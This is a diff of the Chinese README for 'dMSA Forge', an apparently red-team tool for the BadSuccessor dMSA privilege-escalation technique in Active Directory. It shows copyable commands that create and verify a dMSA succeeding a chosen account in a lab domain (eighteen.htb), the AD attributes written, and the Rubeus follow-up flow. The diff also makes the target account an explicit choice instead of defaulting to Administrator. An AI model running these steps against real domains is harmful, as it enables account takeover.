@@ -1,12 +1,12 @@
 # dMSA Forge
 
-[![Release](https://img.shields.io/github/v/release/RedteamNotes/dmsa-forge?label=release)](https://github.com/RedteamNotes/dmsa-forge/releases/tag/v0.5.6)
+[![Release](https://img.shields.io/github/v/release/RedteamNotes/dmsa-forge?label=release)](https://github.com/RedteamNotes/dmsa-forge/releases/tag/v0.5.8)
 [![Tests](https://github.com/RedteamNotes/dmsa-forge/actions/workflows/test.yml/badge.svg)](https://github.com/RedteamNotes/dmsa-forge/actions/workflows/test.yml)
 [![License](https://img.shields.io/badge/license-Impacket%20Apache--1.1-blue)](https://github.com/RedteamNotes/dmsa-forge/blob/main/LICENSE)
 
 **语言：** [English](../README.md) | 简体中文 | [Français](README.fr.md)
 
-当前版本：`v0.5.6`
+当前版本：`v0.5.8`
 
 面向授权 [BadSuccessor](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory) LDAP 工作流的 [dMSA](https://learn.microsoft.com/zh-cn/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview) forge：add、verify、delete、search。
 
@@ -81,10 +81,10 @@ dmsa-forge update --dry-run
 使用 safe profile 预览 add。README 中的命令刻意采用一行可复制形式；如果需要使用 `proxychains -f chain1080.conf -q` 这类本地 wrapper，把它放在 `dmsa-forge` 前面即可。
 
 ```bash
-dmsa-forge plan add eighteen.htb/adam.scott:'PASSWORD' --profile safe --target-ou 'OU=Staff,DC=eighteen,DC=htb' --dmsa-name redpen --principals-allowed '<SID_OR_NAME>'
+dmsa-forge plan add eighteen.htb/adam.scott:'PASSWORD' --profile safe --target-ou 'OU=Staff,DC=eighteen,DC=htb' --dmsa-name redpen --target-account 'ACCOUNT_TO_SUCCEED' --principals-allowed '<SID_OR_NAME>'
 ```
 
-默认情况下，`DOMAIN/user` 会推断 `--scope-domain`、`--scope-base-dn` 和 `--base-dn`；连接默认使用 LDAP/389；`--target-account` 默认是 `Administrator`；设置 `--dmsa-name` 后，`--dns-hostname` 会按账号域名推断。需要覆盖时再显式传对应参数。
+默认情况下，`DOMAIN/user` 会推断 `--scope-domain`、`--scope-base-dn` 和 `--base-dn`；连接默认使用 LDAP/389；设置 `--dmsa-name` 后，`--dns-hostname` 会按账号域名推断。对 `add` 来说，必须显式选择 `--target-account` 指向要接替的账号，并用 `--principals-allowed` 指定可读取托管密码的主体。
 
 ## 操作流程
 
@@ -99,13 +99,13 @@ dmsa-forge verify eighteen.htb/adam.scott:'PASSWORD' --dc-host dc01.eighteen.htb
 计划添加：
 
 ```bash
-dmsa-forge plan add eighteen.htb/adam.scott:'PASSWORD' --dc-host dc01.eighteen.htb --target-ou 'OU=Staff,DC=eighteen,DC=htb' --dmsa-name redpen --principals-allowed '<SID_OR_NAME>'
+dmsa-forge plan add eighteen.htb/adam.scott:'PASSWORD' --dc-host dc01.eighteen.htb --target-ou 'OU=Staff,DC=eighteen,DC=htb' --dmsa-name redpen --target-account 'ACCOUNT_TO_SUCCEED' --principals-allowed '<SID_OR_NAME>'
 ```
 
 添加：
 
 ```bash
-dmsa-forge add eighteen.htb/adam.scott:'PASSWORD' --dc-host dc01.eighteen.htb --target-ou 'OU=Staff,DC=eighteen,DC=htb' --dmsa-name redpen --principals-allowed '<SID_OR_NAME>'
+dmsa-forge add eighteen.htb/adam.scott:'PASSWORD' --dc-host dc01.eighteen.htb --target-ou 'OU=Staff,DC=eighteen,DC=htb' --dmsa-name redpen --target-account 'ACCOUNT_TO_SUCCEED' --principals-allowed '<SID_OR_NAME>'
 ```
 
 添加后验证：
@@ -122,7 +122,7 @@ dmsa-forge delete eighteen.htb/adam.scott:'PASSWORD' --dc-host dc01.eighteen.htb
 
 `add` 或 `verify` 验证成功后，`Next steps` 会直接给出具体的外部 Kerberos 命令。生成流程会先执行 `Rubeus hash`，再把输出中的 AES256 值用于 `asktgt`，最后执行 dMSA `asktgs` 请求。
 
-目标账号解析基于 LDAP 搜索。`add` 默认把 `--target-account` 设为 `Administrator`；如果授权流程指向其它账号，再显式传入对应的 sAMAccountName 或 DN。
+目标账号解析基于 LDAP 搜索。`--target-account` 会写入 `msDS-ManagedAccountPrecededByLink`；`--principals-allowed` 会决定写入 `msDS-GroupMSAMembership` 的 SID。search 生成的后续命令可以带上发现的 principal SID，但目标账号仍然必须由操作者明确选择。
 
 安全控制：
 
